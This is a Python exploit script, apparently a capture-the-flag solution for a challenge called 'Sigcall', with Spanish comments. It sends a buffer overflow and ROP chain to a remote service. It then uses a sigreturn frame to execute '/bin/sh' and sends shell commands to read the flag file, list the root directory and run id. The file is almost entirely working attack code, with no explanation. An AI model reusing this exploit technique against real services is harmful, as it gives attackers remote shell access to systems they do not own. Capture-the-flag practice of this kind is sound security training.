#!/usr/bin/env python3
"""Sigcall - SROP: execve('/bin/sh', [NULL], NULL) y lectura de la flag."""
import socket
import struct
import sys
import time

from pwn import SigreturnFrame, context

context.clear(arch="amd64", os="linux")
HOST, PORT = "<host>", 28807

p64 = lambda x: struct.pack("<Q", x)
u64 = lambda b: struct.unpack("<Q", b.ljust(8, b"\x00"))[0]

POP_R9      = 0x401178
POP_RDI     = 0x4011CF
WRITE_QWORD = 0x401182
POP_RAX     = 0x4011A6
POP_RSI_R15 = 0x4011CD
POP_RDX_RBP = 0x4011B0
SYSCALL     = 0x401161
OFFSET      = 136
BSS         = 0x404028


def set_r9(v):  return p64(POP_R9) + p64(v) + p64(0)
def set_rdi(v): return p64(POP_RDI) + p64(v)
def write_q(addr, val): return set_r9(val) + set_rdi(addr) + p64(WRITE_QWORD) + p64(0)
def set_rax(v): return p64(POP_RAX) + p64(v) + p64(0)
def set_rsi(v): return p64(POP_RSI_R15) + p64(v) + p64(0)
def set_rdx(v): return p64(POP_RDX_RBP) + p64(v) + p64(0)


def build():
    p = b"A" * OFFSET
    # "/bin/sh\0" en 0x404028
    p += write_q(BSS, u64(b"/bin/sh\x00"))
    # argv = {NULL} en 0x404030
    p += write_q(BSS + 8, 0)
    # rt_sigreturn
    p += set_rax(15) + p64(SYSCALL)
    f = SigreturnFrame()
    f.rax = 59          # execve
    f.rdi = BSS         # "/bin/sh"
    f.rsi = BSS + 8     # argv
    f.rdx = 0           # envp
    f.rip = SYSCALL
    f.rsp = 0x404800
    return p + bytes(f)


def main():
    payload = build()
    print(f"payload: {len(payload)} bytes")
    s = socket.create_connection((HOST, PORT), timeout=10)
    s.settimeout(4)
    print("banner:", s.recv(4096))
    s.sendall(payload)
    time.sleep(1.0)
    for cmd in (b"cat /flag.txt\n", b"cat /flag.txt; cat /flag; ls -la /; id\n"):
        try:
            s.sendall(cmd)
        except Exception as e:
            print("send err:", e)
            break
        time.sleep(1.5)
        try:
            data = s.recv(65536)
            print("recv:", data)
            if b"flag{" in data:
                break
        except socket.timeout:
            print("(timeout)")
    s.close()


if __name__ == "__main__":
    main()
